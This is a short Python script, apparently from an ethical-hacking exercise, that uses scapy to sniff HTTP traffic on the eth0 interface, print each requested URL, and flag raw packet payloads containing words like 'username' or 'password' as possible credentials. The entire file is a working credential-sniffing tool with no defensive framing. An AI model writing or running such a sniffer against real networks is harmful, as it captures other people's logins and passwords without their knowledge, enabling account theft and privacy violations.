import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packed, filter="")


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass", "b'uname"]
        for keyword in keywords:
            if keyword in str(load):
                return load


def process_sniffed_packed(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request ==> " + str(url))
        login = get_login(packet)
        if login:
            print("[+] Possible username/password ==>" + str(login))


sniff("eth0")
